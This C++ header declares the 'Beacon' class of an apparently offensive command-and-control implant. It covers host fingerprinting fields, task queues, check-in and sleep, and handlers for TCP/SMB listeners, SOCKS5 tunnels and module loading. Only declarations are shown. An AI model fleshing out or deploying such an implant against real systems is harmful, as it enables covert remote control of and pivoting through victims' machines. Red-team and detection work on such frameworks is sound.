#pragma once

#include "../listener/ListenerTcp.hpp"
#include "../listener/ListenerSmb.hpp"
#include "SocksTunnelClient.hpp"

#include <queue>
#include <string>
#include <vector>
#include <memory>
#include <unordered_map>

#include <nlohmann/json.hpp>

#include "Common.hpp"


class Beacon
{
public:
        Beacon();
        virtual ~Beacon() = default;

	bool initConfig(const std::string& config);
	void run();

protected:
	virtual void  checkIn() = 0;
	bool runTasks();
	void sleep();

	bool execInstruction(C2Message& c2Message, C2Message& c2RetMessage);
	bool cmdToTasks(const std::string& input);
	bool taskResultsToCmd(std::string& output);

	int m_aliveTimerMs;

	std::string m_beaconHash;
	std::string m_hostname;
	std::string m_username;
	std::string m_arch;
	std::string m_privilege;
	std::string m_os;
	std::string m_ips;
	std::string m_pid;
	std::string m_additionalInfo;

        std::queue<C2Message> m_tasks;
        std::queue<C2Message> m_taskResult;

private:
        std::string m_key;
        nlohmann::json m_modulesConfig;

        std::vector<std::unique_ptr<ModuleCmd>> m_moduleCmd;
        std::vector<std::unique_ptr<Listener>> m_listeners;
        std::vector<std::unique_ptr<SocksTunnelClient>> m_socksTunnelClient;

        using InstructionHandler = bool (Beacon::*)(C2Message&, C2Message&);
        std::unordered_map<std::string, InstructionHandler> m_instructionHandlers;

        bool handleEndInstruction(C2Message& c2Message, C2Message& c2RetMessage);
        bool handleSleepInstruction(C2Message& c2Message, C2Message& c2RetMessage);
        bool handleListenerInstruction(C2Message& c2Message, C2Message& c2RetMessage);
        bool handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessage);
        bool handleLoadModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage);
        bool handleUnloadModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage);
        bool handleModuleInstruction(C2Message& c2Message, C2Message& c2RetMessage);

};
